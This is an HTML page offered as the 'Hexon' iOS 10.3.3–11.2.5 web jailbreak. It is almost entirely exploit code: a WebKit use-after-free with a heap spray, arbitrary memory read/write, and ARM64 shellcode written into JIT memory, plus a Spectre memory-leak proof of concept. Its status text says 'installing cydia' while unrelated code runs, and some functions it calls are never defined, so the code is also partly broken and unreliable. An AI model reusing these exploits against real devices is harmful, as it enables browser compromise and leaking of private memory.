<!DOCTYPE html>
<html lang="en">
	<head>
		<link rel="stylesheet" type="text/css" href="assets/Style.css">
<script>
//REMOVE THIS CODE WHEN MAKING IT INTO A JAILBREAK!
//THIS IS JUST A EXPLOIT I UTILIZED WITH THIS!

 var mem0=0;
 var mem1=0;
 var mem2=0;
 function read4(addr) {
 mem0[4] = addr;
 var ret = mem2[0];
 mem0[4] = mem1;
 return ret;
 }

 function write4(addr,val) {
 mem0[4] = addr;
 mem2[0] = val;
 mem0[4] = mem1;
 }

var print = alert;
_dview = null;
function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}
var pressure = new Array(400);
var bufs = new Array(10000);
dgc = function() {
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x40000);
	}
}

function swag() {
	if(bufs[0]) return;
	dgc();
	for (i=0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100*2)
		for (k=0; k < bufs[i].length; )
		{
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

 var trycatch = "";
 for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
 var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x666)
function smashed(stl) {
alert(smsh + fc);
 var jitf = (smsh[(0x10+smsh[(0x10+smsh[(fcp+0x18)/4])/4])/4]);

 smsh[jitf/4] = 0xd28024d0;
 smsh[jitf/4 +1] = 0x58000060;
 smsh[jitf/4 +2] = 0xd4001001;
 smsh[jitf/4 +3] = 0xd65f03c0;
 smsh[jitf/4 +4] = jitf + 0x20;
 smsh[jitf/4 +5] = 1;

 fc();

 var dyncache = smsh[(jitf+0x20)/4];
 var dyncachev = smsh[(jitf+0x20)/4];
 var go = 1;
 while(go) {
    if(smsh[dyncache/4] == 0xfeedfacf)
    {
        for(i=0; i < 0x1000/4; i++) {
            if( smsh[dyncache/4 + i] == 0xd &&
                smsh[dyncache/4 + i + 1] == 0x40 &&
                smsh[dyncache/4 + i + 2] == 0x18 &&
                smsh[dyncache/4 + i + 11] == 0x61707369) // lulziest mach-o parser ever
            {
                go = 0;
                break;
            }
        }
    }
    dyncache += 0x1000;
 }
 dyncache -= 0x1000;
 var bss = [];
 var bss_size = [];
 for(i=0; i < 0x1000/4; i++) {
        if( smsh[dyncache/4 + i] == 0x73625f5f && smsh[dyncache/4 + i + 1] == 0x73) { // lolhax
 bss.push(smsh[dyncache/4 + i + (0x20/4)] + dyncachev-0x80000000);
 bss_size.push(smsh[dyncache/4 + i + (0x28/4)]);
 }
    }




 var shc = jitf/4;




 var filestream = load_binary_resource("loader")

 for(var i = 0; i < filestream.length; )
 {
 var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
 smsh[shc++] = word;
 i+=4;
 }

 jitf &= ~0x3FFF;
 jitf += 0x8000;
 smsh[shc++] = jitf;
 smsh[shc++] = 1;
 // copy macho
 for(var i = 0; i < shll.length; i++)
 {
 write4(jitf+i*4,shll[i]);
 }
 for(var i = 0; i < bss.length; i++)
{
 for(k=bss_size[i]/6; k < bss_size[i]/4; k++) {
    write4(bss[i] + k*4,0);
 }
}
 fc();

 alert(2);
 }


 function write() {
 setTimeout(write_, 100);
 document.getElementById('status').innerText = "installing cydia...";
 }
 function write_(){
 if (smsh.length != 0x16) {
 document.getElementById('status').innerText = "installing cydia...";
 }
var arr = new Array(0x100);
var yolo = new ArrayBuffer(0x1000);
arr[0] = yolo;
arr[1] = 0x13371337;
var not_number = {};
not_number.toString = function() {
	arr = null;
	props["stale"]["value"] = null;
	swag();
	return 10;
};
var props = {
	p0 : { value : 0 },
	p1 : { value : 1 },
	p2 : { value : 2 },
	p3 : { value : 3 },
	p4 : { value : 4 },
	p5 : { value : 5 },
	p6 : { value : 6 },
	p7 : { value : 7 },
	p8 : { value : 8 },
	length : { value : not_number },
	stale : { value : arr },
	after : { value : 666 }
};
var target = [];
var stale = 0;
var before_len = arr.length;
Object.defineProperties(target, props);
stale = target.stale;
stale[0] += 0x101;
stale[1] = {}
for(var z=0; z<0x1000; z++) fc();
for (i=0; i < bufs.length; i++) {
  for (k=0; k < bufs[0].length; k++){
	if(bufs[i][k] == 0x41414242){
	    stale[0] = fc;
        fcp = bufs[i][k];


        stale[0] = {'a':u2d(105, 0x1172600),'b':u2d(0,0),'c':smsh,'d':u2d(0x100,0)}
	    stale[1] = stale[0]
	    bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
        bck = stale[0][4];
        stale[0][4] = 0; // address, low 32 bits
		// stale[0][5] = 1; // address, high 32 bits == 0x100000000
		stale[0][6] = 0xffffffff;
 mem0 = stale[0];
 mem1 = bck;
 mem2 = smsh;
        bufs.push(stale)
	    if (smsh.length != 0x10) {
            smashed(stale[0]);
	    }
 stale[0][4] = bck;
        stale[0][6] = 0x10;

 bufs[i][k] -= 0x10; // FIXUP

 bufs.push(stale[0]);
 bufs.push(stale[0]);
 stale[0] = 0x41414141;
 stale[1] = 0x41414141;
 stale[2] = 0x41414141;


 bufs.push(stale[0]);
 bufs.push(stale);


        return;
	}
   }
 }
 document.location += '#';
 }
</script>
	<style>
	body {
   font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
   font-weight: 300;

   background: linear-gradient(141deg, #051e3e, #251e3e, #451e3e, #651e3e, #851e3e);
    color:white;
    opacity:0.8;
    background-repeat: no-repeat;
    background-size: 1000px 750px;
}
h1 {
	font-family: "Helvetica Neue";
	font-size: 65px;
	font-style: normal;
	font-variant: normal;
	font-weight: 400;
	line-height: 16px;
}
h4 {
font-family: "Helvetica Neue";
	font-size: 14px;
	font-style: normal;
	font-variant: normal;
	font-weight: 200;
	line-height: 26px;
}
a {
text-decoration: none;
font-family: "Helvetica";
}
.button {
background-image:url("assets/Button.png");
	background-size: 100% auto;
	width: 150px;
	height: 50px;
	opacity: 1;
	box-shadow: 0px 0px 3px #000000;
	border-radius: 100px;

}
.buttontext {
padding-top: 10px;
	font-size: 15pt;
	color:white;
	text-decoration: none;
	line-height: 30px;
}
	</style>
	<title>kex-macro</title>
	<!-- META AF-->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<!-- <meta name="apple-mobile-web-app-status-bar-style" content="black"> -->
	</head>
<!--Body-->
<body>
<br/>
	<br/>
<center>
	<h1>Hexon</h1>
	<p>Jailbreak for iOS <b>10.3.3 to 11.2.5</b></p>
	<br/>
	<!-- JB-BUTTON -->
	<div class="button">
	<a id="Linker" href="javascript:go()" style="color:white">
	<div id="Goer" class="buttontext">Jailbreak
	</a>
</div>
	</div>
	<!-- STATUS -->
	<center>
	<h4>Status:</h4><h2 id="status">...</h2>
	<p id=“JBlog”></p>
	</center>
	</div>
	</div>
	<br/>
	<br/>
	<p>
	<br/>
	<br/>
	<div class="LogBox" id="logbox">
		Beta 9
	</div>
	</p>
</center>
</body>

<script>
// WORKER
function worker_function(){
self.onmessage = function(event)
{
    const sharedBuffer = event.data;
    const sharedArray = new Uint32Array(sharedBuffer);
    postMessage('start');
    while(true)
    {
        Atomics.add(sharedArray,0,1);
    }
};
}
if(window!=self)
  worker_function();
// WORKER
// SPECTRE CODE USED TO SCAN MEMORY ARRAYS
// kudos to: http://xlab.tencent.com/special/spectre/spectre_check.html
// simplified less reliable version
function log(msg)
{
	document.getElementById('status').innerText = msg;
	console.log(msg);
}
function asmModule(stdlib,forgein,heap)
{
    'use asm'
    var simpleByteArray = new stdlib.Uint8Array(heap);
    var probeTable = new stdlib.Uint8Array(heap);
    const TABLE1_BYTES = 0x2000000;
    const sizeArrayStart = 0x1000000;
    var junk = 0;
    function init()
    {
        var i =0;
        var j =0;
        // set different "size" values at 4KB offsets each (need to be uncached)
        for(i = 0; (i|0) < 33; i = (i+1)|0 ) // 30 max number of repetitions per try?
        {
            j = (((i<<12)|0) + sizeArrayStart)|0;
            simpleByteArray[(j|0)] = 16; // simpleByteArrayLength
        }
    }
    function vul_call(index, sIndex)
    {
        index = index |0;
        sIndex = sIndex |0;
        var arr_size = 0;
        var j = 0;
        junk = probeTable[0]|0;
        // "size" value repeated at different offsets to avoid having to flush it?
        j = (((sIndex << 12) | 0) +  sizeArrayStart)|0;
        arr_size = simpleByteArray[j|0]|0;
        if ((index|0) < (arr_size|0))
        {
            index = simpleByteArray[index|0]|0;
            index = (index << 12)|0;
            index = (index & ((TABLE1_BYTES-1)|0))|0;
            junk = (junk ^ (probeTable[index]|0))|0;
        }
    }
    return { vul_call: vul_call, init: init };
}
function check(data_array)
{
    function now() { return Atomics.load(sharedArray, 0) }
    function reset() { Atomics.store(sharedArray, 0, 0) }
    function start() { reset(); return now(); }
    function clflush(size, current)
    {
         var offset = 64;
        for (var i = 0; i < ((size) / offset); i++)
        {
            current = evictionView.getUint32(i * offset);
        }
    }
    // start thread counter
//    const worker = new Worker('timer.js');
    const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: 'text/javascript'})));
    const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
    const sharedArray = new Uint32Array(sharedBuffer);
    worker.postMessage(sharedBuffer);
    var simpleByteArrayLength =  16;
    const TABLE1_BYTES = 0x3000000;
    const CACHE_HIT_THRESHOLD = 0
    var probeTable = new Uint8Array(TABLE1_BYTES);
    // eviction buffer (fill LLC)
    var cache_size = CACHE_SIZE * 1024 * 1024;
    var evictionBuffer = new ArrayBuffer(cache_size);
    var evictionView = new DataView(evictionBuffer);
    clflush(cache_size); // because of lazy compilation?
    var asm = asmModule(this, {}, probeTable.buffer)
    worker.onmessage = function(msg)
    {
        function readMemoryByte(malicious_x)
        {
            var results = new Uint32Array(257);
            var simpleByteArray = new Uint8Array(probeTable.buffer);
            var tries =0
            var junk = 0;
            for (tries = 0; tries < 99; tries++)
            {
                var training_x = tries % simpleByteArrayLength; // whatever
                clflush(cache_size);
                // compile and cache functions?
                var time3 = start();
                junk = simpleByteArray[0];
                var time4 = now();
                junk ^= time4 - time3;
                // train branch predictor? (every 4 good indexes uses one malicious, repeat 8 times)
                for (var j = 1; j < 33; j++)
                {
                    for (var z = 0; z < 100; z++) {} // delay
                    // if (j % 4) training_x else malicious_x
                    var x = ((j % 4) - 1) & ~0xFFFF;
                    x = (x | (x >> 16));
                    x = training_x ^ (x & (malicious_x ^ training_x));
                    asm.vul_call(x, j); // x = index to read, j = iteration for fresh size value
                }
                // measure time of all possible offsets
                for (var i = 0; i < 256; i++)
                {
                    var timeS = start();
                    junk =  probeTable[(i << 12)];
                    timeE = now();
                    // if fast offset `i` was accessed
                    if (timeE-timeS <= CACHE_HIT_THRESHOLD) {
                        results[i]++;
                    }
                }
            }
            // select majority vote
            var max = -1;
            for (var i = 0; i < 256; i++)
            {
                max = (max > results[i]) ? max : i;
            }
            results[256] ^= junk; // reuse to avoid optimization?
            return max;
        }
        asm.init();
        // set data to read "out-of-bounds"
        const BOUNDARY = 0x2200000;
        var simpleByteArray = new Uint8Array(probeTable.buffer);
        for (var i = 0; i < data_array.length; i++)
        {
            simpleByteArray[BOUNDARY + i] = data_array[i];
        }
        // leak data
        for (var i = 0; i < data_array.length; i++)
        {
            var data = readMemoryByte(BOUNDARY+i);
            worker.terminate();
            log("leak off=0x" + (BOUNDARY+i).toString(16) +
                ", byte=0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +
                ((data != data_array[i]) ? " (error)" : ""));
        }
        worker.terminate();
        return;
    }
}
const CACHE_SIZE = 12;
function main()
{
    console.log("main::start");
    if(window.SharedArrayBuffer)
    {
        log("installing cydia...: " + CACHE_SIZE + "");
        check([115, 112, 101, 99, 116, 114, 101, 46, 106, 115]);
    }
    else
    {
        alert('FAILED! \n Refreshing so your device doesnt malfunction...');
	location.reload();
    }
}
</script>

	<script>
	// PREVENT SOME KERNEL CORRUPTION
  document.ontouchmove = function(e) {e.preventDefault()};
  // EXPLOIT CODE
function go() {
document.getElementById('status').innerText = 'done..';
document.getElementById('logbox').innerText = 'Beta 9';
document.getElementById("Goer").innerText = ' ';
document.getElementById("Linker").disabled = true;
	//This is here to stop glitches!
document.getElementById('status').innerText = 'running volma...';
setTimeout(go_, 1000);
}
function go_() {
document.getElementById('status').innerText = 'injecting volma...';
	//Adds delay between exploit and current html changes!
setTimeout(kext, 1337);
//L33T
}
function kext() {
		main();
		setTimeout(write, 1337);
}
</script>
</html>
